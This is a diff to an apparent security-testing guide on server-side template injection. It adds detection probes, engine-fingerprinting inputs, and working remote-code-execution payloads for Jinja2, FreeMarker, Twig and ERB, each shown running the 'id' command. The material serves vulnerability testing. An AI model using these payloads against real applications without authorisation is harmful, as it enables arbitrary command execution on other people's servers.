@@ -35,19 +35,40 @@ Confirm execution with a math probe before escalating to RCE:
 | Velocity | `#set($x=7*7)${x}` | `49` |
 | Go text/template | `{{printf "%d" (mul 7 7)}}` or `{{7}}` variants | depends on func map |
 | Handlebars | `{{#with "s"}}{{/with}}` then gadget chains | engine-specific |
+| Jinja2 (string mult) | `{{7*'7'}}` | `7777777` (distinguishes Jinja2 from Twig) |
+| Thymeleaf | `#{7*7}` | `49` |
 
 ### Dynamic Verification
 1. Inject math probe into the suspected template-string parameter.
 2. If output contains computed result (not literal `{{7*7}}`), SSTI is confirmed.
-3. Escalate with engine-specific RCE only after confirmation.
+3. Fingerprint engine before RCE — e.g. `{{config.items()}}` (Jinja2/Flask), `${T(java.lang.Runtime)}` (Spring EL), `<#assign x=1>${x}` (FreeMarker), `{{_self.env.getFilter('id')}}` (Twig).
+4. Escalate with engine-specific RCE only after confirmation.
 
 ## Exploitation Chain
 
-For Python Jinja2, a typical PoC:
+Always confirm evaluation with `{{7*7}}` → `49` (or engine-equivalent) before RCE.
+
+**Jinja2 (Python/Flask)**
 ```
-{{ ''.__class__.__mro__[1].__subclasses__()[...exec...]('id') }}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() }}
 ```
-Full RCE is achievable through class-hierarchy traversal. Always confirm template evaluation with `{{7*7}}` → `49` before attempting RCE payloads.
+
+**FreeMarker (Java)**
+```
+${"freemarker.template.utility.Execute"?new()("id")}
+```
+
+**Twig (PHP)**
+```
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+```
+
+**ERB (Ruby)**
+```
+<%= `id` %>
+<%= system('id') %>
+```
 
 ## Common False Alarms
 
